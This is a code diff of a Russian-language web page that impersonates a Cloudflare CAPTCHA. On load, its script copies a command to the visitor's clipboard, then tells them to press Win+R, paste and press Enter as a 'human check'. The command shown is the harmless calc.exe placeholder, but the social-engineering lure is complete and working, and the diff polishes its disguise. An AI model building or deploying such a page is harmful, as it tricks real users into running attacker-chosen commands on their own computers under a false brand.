@@ -2,29 +2,86 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8" />
-<title>Капча - Подтверждение</title>
+<title>Cloudflare CAPTCHA</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+  body, html {
+    height: 100%;
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #333;
+  }
+  .captcha-container {
+    background: white;
+    padding: 40px 50px;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+  }
+  .captcha-title {
+    font-weight: 700;
+    font-size: 24px;
+    margin-bottom: 20px;
+    color: #1E1E1E;
+  }
+  .captcha-desc {
+    font-size: 16px;
+    margin-bottom: 30px;
+    color: #616161;
+  }
+  .captcha-icon {
+    font-size: 50px;
+    margin-bottom: 30px;
+    color: #667eea;
+  }
+  .instructions {
+    display: inline-block;
+    background: #f5f5f7;
+    border-radius: 8px;
+    padding: 15px 20px;
+    font-family: monospace;
+    font-size: 16px;
+    color: #333;
+    user-select: all;
+  }
+  .footer-text {
+    margin-top: 40px;
+    font-size: 12px;
+    color: #a1a1a1;
+  }
+</style>
 <script>
 window.onload = function() {
-    // Команда для запуска калькулятора в Windows
-    const command = "calc.exe";
-
-    // Поместить команду в буфер обмена
-    navigator.clipboard.writeText(command).then(() => {
-        alert(
-            "Для прохождения проверки выполните следующие шаги:\n\n" +
-            "1. Нажмите Win + R для открытия окна 'Выполнить'.\n" +
-            "2. Нажмите Ctrl + V, чтобы вставить скопированную команду.\n" +
-            "3. Нажмите Enter, чтобы открыть калькулятор.\n\n" +
-            "Это подтверждение, что вы не робот."
-        );
-    }).catch(err => {
-        alert("Не удалось скопировать команду в буфер обмена. Пожалуйста, сделайте это вручную: calc.exe");
-    });
-};
+  const command = "calc.exe";
+  // Скопировать в буфер обмена команду
+  navigator.clipboard.writeText(command).catch(() => {
+    // В случае ошибки можно добавить fallback
+  });
+  alert("Для подтверждения, что вы человек:\n\n" +
+        "1. Нажмите Win + R чтобы открыть окно 'Выполнить'.\n" +
+        "2. Нажмите Ctrl + V, чтобы вставить команду.\n" +
+        "3. Нажмите Enter для запуска калькулятора.\n\n" +
+        "Это способ подтвердить вашу активность.");
+}
 </script>
 </head>
 <body>
-<h1>Проверка безопасности</h1>
-<p>Пожалуйста, выполните инструкции во всплывающем окне, чтобы подтвердить, что вы человек.</p>
+<div class="captcha-container" role="main" aria-labelledby="captchaHeading">
+  <div class="captcha-icon">🔐</div>
+  <h1 id="captchaHeading" class="captcha-title">Проверка безопасности</h1>
+  <p class="captcha-desc">
+    Пожалуйста, подтвердите, что вы не робот, выполнив следующие действия:
+  </p>
+  <div class="instructions" tabindex="0">
+    Нажмите <strong>Win + R</strong>, затем <strong>Ctrl + V</strong> и <strong>Enter</strong>
+  </div>
+  <p class="footer-text">Спасибо за понимание и сотрудничество.</p>
+</div>
 </body>
 </html>
